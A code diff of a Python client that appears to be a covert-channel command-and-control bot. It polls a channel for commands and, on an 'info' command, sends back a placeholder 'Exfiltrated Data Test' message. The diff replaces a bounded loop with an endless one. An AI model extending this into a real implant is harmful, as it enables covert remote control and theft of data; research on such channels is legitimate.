@@ -28,10 +28,9 @@ btm_send_config.sender_id = client_id
 btm_send_config.send_time_slot = 30
 btm_send_config.confirm_time_slot = 50
 
-loop_counter = 99
 mtb_recv_config.prev_unapproved_index = get_current_unapproved_index(channel)
-while(loop_counter > 0):
-    log_print("[INFO] Client: Waiting to receive data...", 1)
+while(True):
+    log_print("[INFO] client: Waiting to receive data...", 1)
     received_data = receive_data(channel, 1, mtb_recv_config)
     mtb_recv_config.prev_unapproved_index = get_current_unapproved_index(channel)
 
@@ -40,12 +39,10 @@ while(loop_counter > 0):
         command_to_execute = command.split(":")[1].strip().lower()
 
     if command_to_execute == "info":
-        log_print("[INFO] Client: Got info command. Sending data...", 1)
+        log_print("[INFO] client: Got info command. Sending data...", 1)
         message = Message()
         message.message_id = generate_random_string(10)
         message.message = message.message_id + ": Exfiltrated Data Test"
         send_data(channel, message, btm_send_config)
     else:
-        log_print("[INFO] Client: No command to execute.", 1)
-
-    loop_counter -= 1
+        log_print("[INFO] client: No command to execute.", 1)
